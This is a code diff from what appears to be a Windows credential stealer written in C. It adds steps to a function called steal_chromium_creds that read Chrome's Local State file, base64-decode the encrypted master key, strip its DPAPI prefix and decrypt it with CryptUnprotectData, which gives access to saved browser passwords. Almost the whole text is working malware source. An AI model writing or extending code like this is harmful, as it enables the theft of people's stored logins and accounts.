@@ -6,11 +6,13 @@
 
 #include "chromium.h"
 
+#include <dpapi.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <wchar.h>
 #include <windows.h>
 
+#include "base64.h"
 #include "sqlite3.h"
 
 // TODO Make this a parameter so that we can support multiple chromium browsers
@@ -217,6 +219,34 @@ PSTR retrieve_encrypted_key(PWSTR filepath) {
   free(buffer);
   return encryptedKey;
 }
+
+// decrypt an encrypted_key using DPAPI
+// NOTE return value must be freed
+PSTR decrypt_key(BYTE *encryptedKey, DWORD encryptedKeyLen) {
+  DATA_BLOB encryptedBlob;
+  encryptedBlob.pbData = encryptedKey;
+  encryptedBlob.cbData = encryptedKeyLen;
+
+  DATA_BLOB decryptedBlob;
+  if (!CryptUnprotectData(&encryptedBlob, NULL, NULL, NULL, NULL, 0,
+                          &decryptedBlob)) {
+    printf("Failed to decrypt data. Error code: %lu\n", GetLastError());
+    return NULL;
+  }
+
+  PSTR decryptedKey = (PSTR)malloc(decryptedBlob.cbData + 1);
+  if (!decryptedKey) {
+    LocalFree(decryptedBlob.pbData);
+    printf("Failed to allocate memory for decrypted key.\n");
+    return NULL;
+  }
+
+  memcpy(decryptedKey, decryptedBlob.pbData, decryptedBlob.cbData);
+  decryptedKey[decryptedBlob.cbData] = '\0';
+
+  LocalFree(decryptedBlob.pbData);
+
+  return decryptedKey;
 }
 
 int steal_chromium_creds() {
@@ -254,15 +284,28 @@ int steal_chromium_creds() {
 
   PWSTR login_state_path = build_path(appDataPath, LOCAL_STATE_FILE);
   wprintf(L"%ls\n", login_state_path);
-  PWSTR encrypted_key = retrieve_encrypted_key(login_state_path);
-  if (!encrypted_key) {
-    fprintf(stderr, "All shit has gone");
-  }
 
-  wprintf(L"Encrypted key: %ls\n", encrypted_key);
+  PSTR encrypted_key = retrieve_encrypted_key(login_state_path);
+  printf("Encrypted key (base64): %s\n", encrypted_key);
+
+  int decoded_size = b64d_size(strlen(encrypted_key));
+  BYTE *decoded_key = (BYTE *)malloc(decoded_size + 1);
+  b64_decode((BYTE *)encrypted_key, strlen(encrypted_key), decoded_key);
+  decoded_key[decoded_size] = '\0';
+  printf("decoded_encrypted_key_len: %d\n", decoded_size);
+
+  // Remove the DPAPI at the start as this not part of the key
+  // Allocate memory for the new string
+  BYTE *clean_decoded_key = (BYTE *)malloc(decoded_size - 5);
+
+  // Copy the substring starting from the 6th character
+  memcpy(clean_decoded_key, (decoded_key + 5), decoded_size - 5);
+
+  PSTR decrypted_key = decrypt_key((BYTE *)clean_decoded_key, decoded_size - 5);
+  printf("decrypted_key: %s\n", decrypted_key);
 
   free_logins(logins, count);
-  free(encrypted_key);  // allocated in ansi_to_wide
+  free(decrypted_key);  // allocated in decrypt_key
   free(fullPath);
   CoTaskMemFree(
       appDataPath);  // free memory from the call to SHGetKnownFolderPath in
